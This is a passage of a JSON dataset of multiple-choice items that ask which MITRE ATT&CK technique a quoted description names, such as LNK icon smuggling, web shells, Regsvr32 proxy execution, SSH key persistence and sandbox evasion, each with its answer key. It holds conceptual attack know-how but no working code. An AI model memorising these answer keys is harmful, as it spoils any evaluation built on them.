      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may smuggle commands to download malicious payloads past content filters by hiding them within otherwise seemingly benign windows shortcut files. Windows shortcut files (.LNK) include many metadata fields, including an icon location field (also known as the `IconEnvironmentDataBlock`) designed to specify the path to an icon file that is to be displayed for the LNK file within a host directory. \n\nAdversaries may abuse this LNK metadata to download malicious payloads. For example, adversaries have been observed using LNK files as phishing payloads to deliver malware. Once invoked (e.g., Malicious File), payloads referenced via external URLs within the LNK icon location field may be downloaded. These files may also then be invoked by Command and Scripting Interpreter/System Binary Proxy Execution arguments within the target path field of the LNK.\n\nLNK Icon Smuggling may also be utilized post compromise, such as malicious scripts executing an LNK on an infected host to download additional malicious payloads.\n\nA. Create or Modify System Process: Systemd Service, B. Domain Trust Discovery, C. Obfuscated Files or Information: LNK Icon Smuggling, D. Obfuscated Files or Information: Software Packing\nA:",
    "context": "",
    "output": "C. Obfuscated Files or Information: LNK Icon Smuggling",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may smuggle commands to download malicious payloads past content filters by hiding them within otherwise seemingly benign windows shortcut files. Windows shortcut files (.LNK) include many metadata fields, including an icon location field (also known as the `IconEnvironmentDataBlock`) designed to specify the path to an icon file that is to be displayed for the LNK file within a host directory. \n\nAdversaries may abuse this LNK metadata to download malicious payloads. For example, adversaries have been observed using LNK files as phishing payloads to deliver malware. Once invoked (e.g., Malicious File), payloads referenced via external URLs within the LNK icon location field may be downloaded. These files may also then be invoked by Command and Scripting Interpreter/System Binary Proxy Execution arguments within the target path field of the LNK.\n\nLNK Icon Smuggling may also be utilized post compromise, such as malicious scripts executing an LNK on an infected host to download additional malicious payloads.",
      "options": "A. Create or Modify System Process: Systemd Service, B. Domain Trust Discovery, C. Obfuscated Files or Information: LNK Icon Smuggling, D. Obfuscated Files or Information: Software Packing",
      "choice": "C. Obfuscated Files or Information: LNK Icon Smuggling",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.\n\nAdversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.\n\nA. Data from Configuration Repository: SNMP (MIB Dump), B. Data Staged: Local Data Staging, C. System Information Discovery, D. Inhibit System Recovery\nA:",
    "context": "",
    "output": "B. Data Staged: Local Data Staging",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.\n\nAdversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.",
      "options": "A. Data from Configuration Repository: SNMP (MIB Dump), B. Data Staged: Local Data Staging, C. System Information Discovery, D. Inhibit System Recovery",
      "choice": "B. Data Staged: Local Data Staging",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.\n\nAdversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence. Although often used as payloads in an infection chain (e.g. Spearphishing Attachment), adversaries may also create a new shortcut as a means of indirection, while also abusing Masquerading to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.\n\nShortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. Browser Extensions) to persistently launch malware.\n\nA. Boot or Logon Autostart Execution: Shortcut Modification, B. Resource Hijacking, C. Credentials from Password Stores: Credentials from Web Browsers, D. Credentials from Password Stores: Windows Credential Manager\nAnswer:",
    "context": "",
    "output": "A. Boot or Logon Autostart Execution: Shortcut Modification",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.\n\nAdversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence. Although often used as payloads in an infection chain (e.g. Spearphishing Attachment), adversaries may also create a new shortcut as a means of indirection, while also abusing Masquerading to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.\n\nShortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. Browser Extensions) to persistently launch malware.",
      "options": "A. Boot or Logon Autostart Execution: Shortcut Modification, B. Resource Hijacking, C. Credentials from Password Stores: Credentials from Web Browsers, D. Credentials from Password Stores: Windows Credential Manager",
      "choice": "A. Boot or Logon Autostart Execution: Shortcut Modification",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via Network Device CLI (e.g. <code>reload</code>).\n\nShutting down or rebooting systems may disrupt access to computer resources for legitimate users while also impeding incident response/recovery.\n\nAdversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as Disk Structure Wipe or Inhibit System Recovery, to hasten the intended effects on system availability.\n\nPossible answers:\nA. System Shutdown/Reboot, B. Gather Victim Org Information: Identify Business Tempo, C. OS Credential Dumping: /etc/passwd and /etc/shadow, D. Modify System Image",
    "context": "",
    "output": "A. System Shutdown/Reboot",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via Network Device CLI (e.g. <code>reload</code>).\n\nShutting down or rebooting systems may disrupt access to computer resources for legitimate users while also impeding incident response/recovery.\n\nAdversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as Disk Structure Wipe or Inhibit System Recovery, to hasten the intended effects on system availability.",
      "options": "A. System Shutdown/Reboot, B. Gather Victim Org Information: Identify Business Tempo, C. OS Credential Dumping: /etc/passwd and /etc/shadow, D. Modify System Image",
      "choice": "A. System Shutdown/Reboot",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may establish persistence through executing malicious commands triggered by a user\u2019s shell. User Unix Shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (<code>/etc</code>) and the user\u2019s home directory (<code>~/</code>) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user\u2019s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. \n\nAdversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the <code>/etc/profile</code> and <code>/etc/profile.d</code> files. These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>, <code>~/.bash_login</code>, or <code>~/.profile</code> which are sourced when a user opens a command-line interface or connects remotely. Since the system only executes the first existing file in the listed order, adversaries have used <code>~/.bash_profile</code> to ensure execution. Adversaries have also leveraged the <code>~/.bashrc</code> file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface. Some malware targets the termination of a program to trigger execution, adversaries can use the <code>~/.bash_logout</code> file to execute malicious commands at the end of a session. \n\nFor macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>, and <code>/etc/zlogin</code>. The login shell then configures the user environment with <code>~/.zprofile</code> and <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc</code> to configure the user environment. Upon exiting, <code>/etc/zlogout</code> and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes <code>/etc/bashrc</code> on startup.\n\nA. Access Token Manipulation: Token Impersonation/Theft, B. Event Triggered Execution: Unix Shell Configuration Modification, C. Indicator Removal: File Deletion, D. Stage Capabilities: Upload Tool\nA:",
    "context": "",
    "output": "B. Event Triggered Execution: Unix Shell Configuration Modification",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may establish persistence through executing malicious commands triggered by a user\u2019s shell. User Unix Shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (<code>/etc</code>) and the user\u2019s home directory (<code>~/</code>) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user\u2019s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. \n\nAdversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the <code>/etc/profile</code> and <code>/etc/profile.d</code> files. These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>, <code>~/.bash_login</code>, or <code>~/.profile</code> which are sourced when a user opens a command-line interface or connects remotely. Since the system only executes the first existing file in the listed order, adversaries have used <code>~/.bash_profile</code> to ensure execution. Adversaries have also leveraged the <code>~/.bashrc</code> file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface. Some malware targets the termination of a program to trigger execution, adversaries can use the <code>~/.bash_logout</code> file to execute malicious commands at the end of a session. \n\nFor macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>, and <code>/etc/zlogin</code>. The login shell then configures the user environment with <code>~/.zprofile</code> and <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc</code> to configure the user environment. Upon exiting, <code>/etc/zlogout</code> and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes <code>/etc/bashrc</code> on startup.",
      "options": "A. Access Token Manipulation: Token Impersonation/Theft, B. Event Triggered Execution: Unix Shell Configuration Modification, C. Indicator Removal: File Deletion, D. Stage Capabilities: Upload Tool",
      "choice": "B. Event Triggered Execution: Unix Shell Configuration Modification",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Answer which mitre technique is related to the description: Adversaries may gather information about the victim's network domain(s) that can be used during targeting. Information about domains and their properties may include a variety of details, including what domain(s) the victim owns as well as administrative data (ex: name, registrar, etc.) and more directly actionable information such as contacts (email addresses and phone numbers), business addresses, and name servers.\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Information about victim domains and their properties may also be exposed to adversaries via online or other accessible data sets (ex: WHOIS). Where third-party cloud providers are in use, this information may also be exposed through publicly available API endpoints, such as GetUserRealm and autodiscover in Office 365 environments. Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Technical Databases, Search Open Websites/Domains, or Phishing for Information), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: Phishing).\nA. Remote Access Software, B. Gather Victim Network Information: Domain Properties, C. Adversary-in-the-Middle, D. Network Denial of Service: Direct Network Flood\nAnswer:",
    "context": "",
    "output": "B. Gather Victim Network Information: Domain Properties",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may gather information about the victim's network domain(s) that can be used during targeting. Information about domains and their properties may include a variety of details, including what domain(s) the victim owns as well as administrative data (ex: name, registrar, etc.) and more directly actionable information such as contacts (email addresses and phone numbers), business addresses, and name servers.\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Information about victim domains and their properties may also be exposed to adversaries via online or other accessible data sets (ex: WHOIS). Where third-party cloud providers are in use, this information may also be exposed through publicly available API endpoints, such as GetUserRealm and autodiscover in Office 365 environments. Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Technical Databases, Search Open Websites/Domains, or Phishing for Information), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: Phishing).",
      "options": "A. Remote Access Software, B. Gather Victim Network Information: Domain Properties, C. Adversary-in-the-Middle, D. Network Denial of Service: Direct Network Flood",
      "choice": "B. Gather Victim Network Information: Domain Properties",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to access the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.\n\nIn addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. China Chopper Web shell client).\nA. Network Denial of Service, B. Server Software Component: Web Shell, C. Compromise Infrastructure: Virtual Private Server, D. Event Triggered Execution: Screensaver",
    "context": "",
    "output": "B. Server Software Component: Web Shell",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to access the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.\n\nIn addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. China Chopper Web shell client).",
      "options": "A. Network Denial of Service, B. Server Software Component: Web Shell, C. Compromise Infrastructure: Virtual Private Server, D. Event Triggered Execution: Screensaver",
      "choice": "B. Server Software Component: Web Shell",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may modify the SSH <code>authorized_keys</code> file to maintain persistence on a victim host. Linux distributions and macOS commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The <code>authorized_keys</code> file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under <code>&lt;user-home&gt;/.ssh/authorized_keys</code>. Users may edit the system\u2019s SSH config file to modify the directives PubkeyAuthentication and RSAAuthentication to the value \u201cyes\u201d to ensure public key and RSA authentication are enabled. The SSH config file is usually located under <code>/etc/ssh/sshd_config</code>.\n\nAdversaries may modify SSH <code>authorized_keys</code> files directly with scripts or shell commands to add their own adversary-supplied public keys. In cloud environments, adversaries may be able to modify the SSH authorized_keys file of a particular virtual machine via the command line interface or rest API. For example, by using the Google Cloud CLI\u2019s \u201cadd-metadata\u201d command an adversary may add SSH keys to a user account. Similarly, in Azure, an adversary may update the authorized_keys file of a virtual machine via a PATCH request to the API. This ensures that an adversary possessing the corresponding private key may log in as an existing user via SSH. It may also lead to privilege escalation where the virtual machine or instance has distinct permissions from the requesting user.\n\nWhere authorized_keys files are modified via cloud APIs or command line interfaces, an adversary may achieve privilege escalation on the target virtual machine if they add a key to a higher-privileged user. \n\nSSH keys can also be added to accounts on network devices, such as with the `ip ssh pubkey-chain` Network Device CLI command.\nA. Event Triggered Execution: Netsh Helper DLL, B. Account Manipulation: SSH Authorized Keys, C. Masquerading: Invalid Code Signature, D. Modify Cloud Compute Infrastructure: Modify Cloud Compute Configurations",
    "context": "",
    "output": "B. Account Manipulation: SSH Authorized Keys",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may modify the SSH <code>authorized_keys</code> file to maintain persistence on a victim host. Linux distributions and macOS commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The <code>authorized_keys</code> file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under <code>&lt;user-home&gt;/.ssh/authorized_keys</code>. Users may edit the system\u2019s SSH config file to modify the directives PubkeyAuthentication and RSAAuthentication to the value \u201cyes\u201d to ensure public key and RSA authentication are enabled. The SSH config file is usually located under <code>/etc/ssh/sshd_config</code>.\n\nAdversaries may modify SSH <code>authorized_keys</code> files directly with scripts or shell commands to add their own adversary-supplied public keys. In cloud environments, adversaries may be able to modify the SSH authorized_keys file of a particular virtual machine via the command line interface or rest API. For example, by using the Google Cloud CLI\u2019s \u201cadd-metadata\u201d command an adversary may add SSH keys to a user account. Similarly, in Azure, an adversary may update the authorized_keys file of a virtual machine via a PATCH request to the API. This ensures that an adversary possessing the corresponding private key may log in as an existing user via SSH. It may also lead to privilege escalation where the virtual machine or instance has distinct permissions from the requesting user.\n\nWhere authorized_keys files are modified via cloud APIs or command line interfaces, an adversary may achieve privilege escalation on the target virtual machine if they add a key to a higher-privileged user. \n\nSSH keys can also be added to accounts on network devices, such as with the `ip ssh pubkey-chain` Network Device CLI command.",
      "options": "A. Event Triggered Execution: Netsh Helper DLL, B. Account Manipulation: SSH Authorized Keys, C. Masquerading: Invalid Code Signature, D. Modify Cloud Compute Infrastructure: Modify Cloud Compute Configurations",
      "choice": "B. Account Manipulation: SSH Authorized Keys",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Answer which mitre technique is related to the description: Adversaries may search public digital certificate data for information about victims that can be used during targeting. Digital certificates are issued by a certificate authority (CA) in order to cryptographically verify the origin of signed content. These certificates, such as those used for encrypted web traffic (HTTPS SSL/TLS communications), contain information about the registered organization such as name and location.\n\nAdversaries may search digital certificate data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about certificates. Digital certificate data may also be available from artifacts signed by the organization (ex: certificates used from encrypted web traffic are served with content). Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Phishing for Information), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Trusted Relationship).\nA. Search Open Technical Databases: Digital Certificates, B. Domain Trust Discovery, C. Gather Victim Network Information: Domain Properties, D. Scheduled Task/Job: At\nAnswer:",
    "context": "",
    "output": "A. Search Open Technical Databases: Digital Certificates",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may search public digital certificate data for information about victims that can be used during targeting. Digital certificates are issued by a certificate authority (CA) in order to cryptographically verify the origin of signed content. These certificates, such as those used for encrypted web traffic (HTTPS SSL/TLS communications), contain information about the registered organization such as name and location.\n\nAdversaries may search digital certificate data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about certificates. Digital certificate data may also be available from artifacts signed by the organization (ex: certificates used from encrypted web traffic are served with content). Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Phishing for Information), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Trusted Relationship).",
      "options": "A. Search Open Technical Databases: Digital Certificates, B. Domain Trust Discovery, C. Gather Victim Network Information: Domain Properties, D. Scheduled Task/Job: At",
      "choice": "A. Search Open Technical Databases: Digital Certificates",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).\n\nA. Gather Victim Org Information: Determine Physical Locations, B. Web Service: Dead Drop Resolver, C. Impair Defenses: Downgrade Attack, D. Remote Services: Distributed Component Object Model\nAnswer:",
    "context": "",
    "output": "B. Web Service: Dead Drop Resolver",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",
      "options": "A. Gather Victim Org Information: Determine Physical Locations, B. Web Service: Dead Drop Resolver, C. Impair Defenses: Downgrade Attack, D. Remote Services: Distributed Component Object Model",
      "choice": "B. Web Service: Dead Drop Resolver",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from The technique during automated discovery to shape follow-on behaviors.\n\nAdversaries may use several methods to accomplish The technique such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.\n\nPossible answers:\nA. Access Token Manipulation, B. Virtualization/Sandbox Evasion, C. Impair Defenses: Downgrade Attack, D. Server Software Component: SQL Stored Procedures",
    "context": "",
    "output": "B. Virtualization/Sandbox Evasion",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from The technique during automated discovery to shape follow-on behaviors.\n\nAdversaries may use several methods to accomplish The technique such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
      "options": "A. Access Token Manipulation, B. Virtualization/Sandbox Evasion, C. Impair Defenses: Downgrade Attack, D. Server Software Component: SQL Stored Procedures",
      "choice": "B. Virtualization/Sandbox Evasion",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. \n\nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed.  This variation of the technique is often referred to as a \"Squiblydoo\" and has been used in campaigns targeting governments.  \n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via Component Object Model Hijacking.\nA. System Binary Proxy Execution: Regsvr32, B. Access Token Manipulation: Create Process with Token, C. Inter-Process Communication, D. Hijack Execution Flow: KernelCallbackTable",
    "context": "",
    "output": "A. System Binary Proxy Execution: Regsvr32",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. \n\nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed.  This variation of the technique is often referred to as a \"Squiblydoo\" and has been used in campaigns targeting governments.  \n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via Component Object Model Hijacking.",
      "options": "A. System Binary Proxy Execution: Regsvr32, B. Access Token Manipulation: Create Process with Token, C. Inter-Process Communication, D. Hijack Execution Flow: KernelCallbackTable",
      "choice": "A. System Binary Proxy Execution: Regsvr32",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may compromise serverless cloud infrastructure, such as Cloudflare Workers or AWS Lambda functions, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them. \n\nOnce compromised, the serverless runtime environment can be leveraged to either respond directly to infected machines or to Proxy traffic to an adversary-owned command and control server. As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers.\n\nPossible answers:\nA. Resource Hijacking, B. Inhibit System Recovery, C. Remote Service Session Hijacking: SSH Hijacking, D. Compromise Infrastructure: Serverless",
    "context": "",
    "output": "D. Compromise Infrastructure: Serverless",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may compromise serverless cloud infrastructure, such as Cloudflare Workers or AWS Lambda functions, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them. \n\nOnce compromised, the serverless runtime environment can be leveraged to either respond directly to infected machines or to Proxy traffic to an adversary-owned command and control server. As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers.",
      "options": "A. Resource Hijacking, B. Inhibit System Recovery, C. Remote Service Session Hijacking: SSH Hijacking, D. Compromise Infrastructure: Serverless",
      "choice": "D. Compromise Infrastructure: Serverless",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.\n\nAdversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: Scheduled Task/Job). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled Multi-Stage Channels to avoid analysis and scrutiny.\n\nBenign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such as Pings, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments. Another variation, commonly referred to as API hammering, involves making various calls to Native API functions in order to delay execution (while also potentially overloading analysis environments with junk data).\n\nAdversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.\n\nPossible answers:\nA. Search Open Technical Databases, B. Defacement: External Defacement, C. Virtualization/Sandbox Evasion: Time Based Evasion, D. Data from Configuration Repository",
    "context": "",
    "output": "C. Virtualization/Sandbox Evasion: Time Based Evasion",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
